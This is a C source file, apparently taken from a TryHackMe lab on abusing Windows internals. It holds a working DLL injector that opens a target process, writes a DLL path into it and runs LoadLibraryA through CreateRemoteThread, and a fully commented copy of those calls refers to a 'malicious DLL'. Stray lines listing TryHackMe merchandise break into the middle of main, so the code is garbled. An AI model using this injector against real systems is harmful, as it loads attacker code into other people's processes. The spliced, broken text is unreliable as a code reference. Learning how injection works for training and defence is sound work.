#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// From https://tryhackme.com/room/abusingwindowsinternals

DWORD getProcessId(const char *processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot) {
        PROCESSENTRY32 entry;
        entry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &entry)) {
            do {
                if (!strcmp(entry.szExeFile, processName)) {
                    return entry.th32ProcessID;
                }
            } while (Process32Next(hSnapshot, &entry));
        }
    }
    else {
        return 0;
    }
}

int main(int argc, char *argv[]) {

    if (argc != 3) {
        printf("Cannot find require parameters\n");
        printf("Usage: dll-injector.exe <process name> <path to DLL>\n");
        exit(0);
    }

    char dllLibFullPath[256];

    LPCSTR processName = argv[1];
    LPCSTR dllLibName = argv[2];

    DWORD processId = getProcessId(processName);
    if (!processId) {
        exit(1);
    }ryHackMe T-Shirt
TryHackMe Baseball Cap
TryHackMe Baseball Cap
TryHackMe Baseball Cap
7 Day Streak Freeze
7 Day Streak Freeze
7 Day Streak Freeze
1 Month Premium Voucher
1 Month Premium Voucher
1 Month Premium Voucher


    if (!GetFullPathName(dllLibName, sizeof(dllLibFullPath), dllLibFullPath, NULL)) {
        exit(1);
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        exit(1);
    }

    LPVOID dllAllocatedMemory = VirtualAllocEx(hProcess, NULL, strlen(dllLibFullPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (dllAllocatedMemory == NULL) {
        exit(1);
    }

    if (!WriteProcessMemory(hProcess, dllAllocatedMemory, dllLibFullPath, strlen(dllLibFullPath) + 1, NULL)) {
        exit(1);
    }

    LPVOID loadLibrary = (LPVOID) GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

    HANDLE remoteThreadHandler = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) loadLibrary, dllAllocatedMemory, 0, NULL);
    if (remoteThreadHandler == NULL) {
        exit(1);
    }

    CloseHandle(hProcess);

    return 0;
}

/**
DWORD getProcessId(const char *processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot( // Snapshot the specificed process
			TH32CS_SNAPPROCESS, // Include all processes residing on the system
			0 // Indicates the current process
		);
    if (hSnapshot) {
        PROCESSENTRY32 entry; // Adds a pointer to the PROCESSENTRY32 structure
        entry.dwSize = sizeof(PROCESSENTRY32); // Obtains the byte size of the structure
        if (Process32First( // Obtains the first process in the snapshot
					hSnapshot, // Handle of the snapshot
					&entry // Pointer to the PROCESSENTRY32 structure
				)) {
            do {
                if (!strcmp( // Compares two strings to determine if the process name matches
									entry.szExeFile, // Executable file name of the current process from PROCESSENTRY32
									processName // Supplied process name
								)) { 
                    return entry.th32ProcessID; // Process ID of matched process
                }
            } while (Process32Next( // Obtains the next process in the snapshot
							hSnapshot, // Handle of the snapshot
							&entry
						)); // Pointer to the PROCESSENTRY32 structure
        }
    }

DWORD processId = getProcessId(processName); // Stores the enumerated process ID

HANDLE hProcess = OpenProcess(
	PROCESS_ALL_ACCESS, // Requests all possible access rights
	FALSE, // Child processes do not inheret parent process handle
	processId // Stored process ID
);

LPVOID dllAllocatedMemory = VirtualAllocEx(
	hProcess, // Handle for the target process
	NULL, 
	strlen(dllLibFullPath), // Size of the DLL path
	MEM_RESERVE | MEM_COMMIT, // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);

WriteProcessMemory(
	hProcess, // Handle for the target process
	dllAllocatedMemory, // Allocated memory region
	dllLibFullPath, // Path to the malicious DLL
	strlen(dllLibFullPath) + 1, // Byte size of the malicious DLL
	NULL
);

LPVOID loadLibrary = (LPVOID) GetProcAddress(
	GetModuleHandle("kernel32.dll"), // Handle of the module containing the call
	"LoadLibraryA" // API call to import
);
HANDLE remoteThreadHandler = CreateRemoteThread(
	hProcess, // Handle for the target process
	NULL, 
	0, // Default size from the execuatable of the stack
	(LPTHREAD_START_ROUTINE) loadLibrary, pointer to the starting function
	dllAllocatedMemory, // pointer to the allocated memory region
	0, // Runs immediately after creation
	NULL
**/
